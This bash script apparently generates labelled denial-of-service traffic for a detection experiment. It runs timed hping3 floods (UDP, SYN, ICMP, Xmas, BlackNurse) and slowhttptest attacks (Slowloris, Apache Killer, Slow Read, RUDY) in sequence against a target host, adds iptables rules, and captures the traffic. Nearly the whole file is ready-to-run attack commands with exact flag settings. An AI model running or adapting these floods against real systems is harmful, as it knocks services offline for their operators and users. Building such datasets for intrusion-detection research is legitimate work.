#!/bin/bash

#Import variables from file
source variables.sh

function interupted {
    iptables -D OUTPUT -d ytelse1.uninett.no -p tcp --tcp-flags RST RST -j DROP
    kill $pid_capture
    #scp -r /home/ somewhere:/home/
    exit
}

trap interupted 2
trap interupted 9

iptables -I OUTPUT -d ytelse1.uninett.no -p tcp --tcp-flags RST RST -j DROP

#Define variables for whole attack
attack_procedure_log="/home/logs/attack_procedure.log"

attack(){
    #Write to file
    echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

    #Run the attack
    ./attack.sh $1 $2 $3 "$4"

    #Write to file
    echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
}

mul_attack(){
    #Write to file
    echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

    #Run the attack
    ./mul_attacks.sh $1 $2 $3 "$4" "$5"

    #Write to file
    echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
}

./capture.sh & pid_capture=$!

destination_ip=$machine13_ip
destination_port=$machine13_port

#Define variables for attack 6
attack_type="udp"
attack_duration=$((3*60)) # in seconds
attack_script="hping3 --flood --udp -p $destination_port $destination_ip"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 1" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((10*60))
#Write to file
echo "Break 1 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

#Define variables for attack 2
attack_type="SlowLoris"
attack_duration=$((9*60)) # in seconds
attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http:/$destination_ip -x 24 -p 3"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 2" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((6*60))
#Write to file
echo "Break 2 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 7
attack_type="apacheKiller"
attack_duration=$((16*60)) # in seconds
attack_script="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD -u http:/$destination_ip"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 3" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((15*60))
#Write to file
echo "Break 3 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 3
attack_type="ping"
attack_duration=$((5*60)) # in seconds
attack_script="hping3 --flood -1 $destination_ip"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 4" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((7*60))
#Write to file
echo "Break 4 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

#Define variables for attack 9
attack_type="slowRead"
attack_duration=$((13*60)) # in seconds
attack_script="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http:/$destination_ip -p 3"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 5" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((14*60))
#Write to file
echo "Break 5 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 5
attack_type="blacknurse"
attack_duration=$((10*60)) # in seconds
attack_script="hping3 -1 --flood -C 3 -K 3 $destination_ip"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 6" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((3*60))
#Write to file
echo "Break 6 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 1
attack_type="TCP_SYN_Flood"
attack_duration=$((7*60)) # in seconds
attack_script="hping3 --flood -p $destination_port -S $destination_ip"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 7" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((20*60))
#Write to file
echo "Break 7 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 4
attack_type="RUDY"
attack_duration=$((9*60)) # in seconds
attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http:/$destination_ip -x 10 -p 3"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 8" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((6*60))
#Write to file
echo "Break 8 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 8
attack_type="xmas"
attack_duration=$((4*60)) # in seconds
attack_script="hping3 --flood -p $destination_port -F -S -P -A -U -X -Y $destination_ip"

attack $attack_type $attack_duration $destination_ip "$attack_script"

#Write to file
echo "Started break 9" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((3*60))
#Write to file
echo "Break 9 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for combined attack 1
attack_type="UDPandSlowLoris"
attack_duration=$((15*60)) # in seconds
attack_script1="hping3 --flood --udp -p $destination_port $destination_ip"
attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http:/$destination_ip -x 24 -p 3"

mul_attack $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"


#Write to file
echo "Started break 10" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Wait for next attack
sleep $((7*60))
#Write to file
echo "Break 10 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log



#Define variables for combined attack 1
attack_type="ICMPandRUDY"
attack_duration=$((10*60)) # in seconds
attack_script1="hping3 --flood -1 $destination_ip"
attack_script2="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http:/$destination_ip -x 10 -p 3"

mul_attack $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"

iptables -D OUTPUT -d ytelse1.uninett.no -p tcp --tcp-flags RST RST -j DROP

kill $pid_capture

#scp -r /home/ somewhere:/home/